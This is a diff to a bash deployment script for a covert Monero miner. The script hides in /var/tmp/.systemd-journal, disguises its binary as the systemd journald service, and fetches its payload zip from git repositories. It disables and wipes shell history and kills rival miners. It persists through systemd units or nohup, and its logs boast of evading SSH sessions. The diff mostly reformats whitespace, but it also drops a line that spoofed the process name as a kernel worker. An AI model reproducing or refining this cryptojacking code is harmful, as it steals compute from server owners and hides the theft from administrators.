@@ -10,8 +10,6 @@ unset HISTFILE 2>/dev/null
 export HISTSIZE=0
 export HISTFILESIZE=0
 set +o history
-# Hide script execution from 'ps aux' by spoofing process name to a kernel thread
-exec -a "[kworker/0:1H]" bash 
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
 log() { echo -e "${GREEN}[+]${NC} $1"; }
@@ -27,15 +25,15 @@ install_deps() {
     done
     if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
         PKG_STR="${MISSING_PKGS[*]}"
-        if command -v apt-get >/dev/null 2>&1; then 
+        if command -v apt-get >/dev/null 2>&1; then
             apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq $PKG_STR >/dev/null 2>&1
-        elif command -v yum >/dev/null 2>&1; then 
+        elif command -v yum >/dev/null 2>&1; then
             yum install -y -q $PKG_STR >/dev/null 2>&1
-        elif command -v dnf >/dev/null 2>&1; then 
+        elif command -v dnf >/dev/null 2>&1; then
             dnf install -y -q $PKG_STR >/dev/null 2>&1
-        elif command -v apk >/dev/null 2>&1; then 
+        elif command -v apk >/dev/null 2>&1; then
             apk add -q $PKG_STR >/dev/null 2>&1
-        elif command -v zypper >/dev/null 2>&1; then 
+        elif command -v zypper >/dev/null 2>&1; then
             zypper install -y -q $PKG_STR >/dev/null 2>&1
         fi
     fi
@@ -46,7 +44,7 @@ setup_hidden_env() {
     DEPLOY_DIR="/var/tmp/.systemd-journal"
     mkdir -p "$DEPLOY_DIR" 2>/dev/null
     cd "$DEPLOY_DIR" || exit 1
-    
+
     # ★ 100% C2 SAFE ZOMBIE KILL ★
     # ONLY kill exact known old miner names. NO broad "-f" matches, NO "network" kill.
     pkill -9 -x "journald-sync" 2>/dev/null
@@ -66,7 +64,7 @@ setup_payload() {
     CONFIG_DEST="$DEPLOY_DIR/config.json"
 
     rm -rf "$TMP_DIR" 2>/dev/null
-    
+
     CLONE_SUCCESS=false
     for REPO in "${REPOS[@]}"; do
         git clone --depth=1 --quiet "$REPO" "$TMP_DIR" 2>/dev/null
@@ -77,12 +75,12 @@ setup_payload() {
             rm -rf "$TMP_DIR" 2>/dev/null
         fi
     done
-    
+
     [ "$CLONE_SUCCESS" = false ] && error "All repositories failed or main.zip missing"
-    
+
     mkdir -p "$TMP_DIR/extracted"
     unzip -q -o "$TMP_DIR/main.zip" -d "$TMP_DIR/extracted"
-    
+
     # ★ SMART SUBFOLDER TRAP FIX ★
     if [ -d "$TMP_DIR/extracted/main" ]; then
         mv "$TMP_DIR/extracted/main/"* "$TMP_DIR/extracted/" 2>/dev/null
@@ -95,12 +93,12 @@ setup_payload() {
     # Find binary (handle old names gracefully)
     BIN=$(find "$TMP_DIR/extracted" -maxdepth 1 -type f \( -name "journald-sync" -o -name "network" -o -name "kmod-static-nodes" \) | head -1)
     CFG=$(find "$TMP_DIR/extracted" -maxdepth 1 -name "config.json" -type f | head -1)
-    
+
     [ -z "$BIN" ] || [ -z "$CFG" ] && error "Missing binary or config.json in main.zip"
-    
+
     cp "$BIN" "$BINARY_DEST" && chmod +x "$BINARY_DEST"
     cp "$CFG" "$CONFIG_DEST" && chmod 644 "$CONFIG_DEST"
-    
+
     # ★ DYNAMIC IP INJECTION (Set Worker Name to VPS IP for SupportXMR)
     VPS_IP=$(curl -s -4 ifconfig.me || hostname -I | awk '{print $1}' | tr -d '[:space:]')
     [ -z "$VPS_IP" ] && VPS_IP="Node-$(hostname)"
@@ -204,7 +202,7 @@ activate_and_clean() {
     systemctl daemon-reload >/dev/null 2>&1
     systemctl enable systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1
     systemctl start systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1
-    
+
     # ★ SMART FALLBACK: If systemd fails (Docker/LXC/Restricted VPS), start via nohup
     sleep 2
     if ! pgrep -x "journald-sync" >/dev/null 2>&1; then
@@ -216,7 +214,7 @@ activate_and_clean() {
     history -c && history -w >/dev/null 2>&1
     cat /dev/null > ~/.bash_history 2>/dev/null
     cat /dev/null > /root/.bash_history 2>/dev/null
-    
+
     log "=== APEX DEPLOYMENT COMPLETE ==="
     log "Hidden Dir: /var/tmp/.systemd-journal/"
     log "Evasion: systemctl stop on SSH, resumes 10m after logout."
